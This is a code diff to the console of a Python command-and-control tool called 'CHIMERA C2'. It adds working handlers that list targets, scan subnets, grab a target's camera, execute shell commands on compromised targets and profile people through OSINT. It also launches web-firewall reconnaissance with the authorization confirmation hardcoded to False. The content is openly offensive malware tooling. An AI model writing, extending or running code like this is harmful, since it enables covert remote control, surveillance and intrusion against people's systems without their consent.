@@ -174,11 +174,14 @@ def cli_interface():
     print(f"\n{Fore.WHITE}CHIMERA C2 Console {Style.RESET_ALL}| Type 'help' to list commands | 'exit' to quit")
     while True:
         try:
-            cmd = input(f"\nCHIMERA> ").strip().split()
-            if not cmd:
+            raw_cmd = input(f"\nCHIMERA> ").strip()
+            if not raw_cmd:
                 continue
-            
-            if cmd == "help":
+
+            cmd = raw_cmd.split()
+            command = cmd[0].lower()
+
+            if command == "help":
                 print("""
     🛠️  COMMANDS:
       sessions          : List active targets
@@ -186,18 +189,60 @@ def cli_interface():
       camera <id>       : Grab target cam (Pegasus)
       exec <id> <cmd>   : Execute shell cmd (Ghost)
       sherlock <user>   : OSINT profile (Sherlock)
+      falcon <target>   : WAF architecture recon (Peregrine Falcon)
       clear             : Clear screen
                 """)
             
-            elif cmd == "sessions":
+            elif command == "sessions":
                 print(json.dumps(chimera.sessions, indent=2))
-            
-            elif cmd == "clear":
+
+            elif command == "scan":
+                if len(cmd) < 2:
+                    print("Usage: scan <subnet>")
+                    continue
+                subnet = cmd[1]
+                results = chimera.fing_network_scan(subnet)
+                print(json.dumps(results, indent=2))
+
+            elif command == "camera":
+                result = chimera.pegasus_camera_grab()
+                print(json.dumps(result, indent=2))
+
+            elif command == "exec":
+                if len(cmd) < 3:
+                    print("Usage: exec <id> <cmd>")
+                    continue
+                command_payload = " ".join(cmd[2:])
+                result = chimera.ghost_execute(command_payload)
+                print(json.dumps(result, indent=2))
+
+            elif command == "sherlock":
+                if len(cmd) < 2:
+                    print("Usage: sherlock <username>")
+                    continue
+                output = chimera.sherlock_osint(cmd[1])
+                print(output)
+
+            elif command == "falcon":
+                if len(cmd) < 2:
+                    print("Usage: falcon <target> [output.json]")
+                    continue
+                target = cmd[1]
+                output_file = cmd[2] if len(cmd) > 2 else None
+                from modules import peregrine_falcon
+
+                peregrine_falcon.run_peregrine(
+                    target=target,
+                    output_file=output_file,
+                    confirm_authorization=False,
+                )
+
+            elif command == "clear":
                 os.system('cls' if os.name == 'nt' else 'clear')
                 # Reprint a small header
                 print(f"{Fore.MAGENTA}CHIMERA C2{Style.RESET_ALL} - Active Sessions:")
             
-            elif cmd == "exit":
+            elif command == "exit":
                 print(f"{Fore.RED}[*] Standing down. Stay sharp.{Style.RESET_ALL}")
                 sys.exit()
             
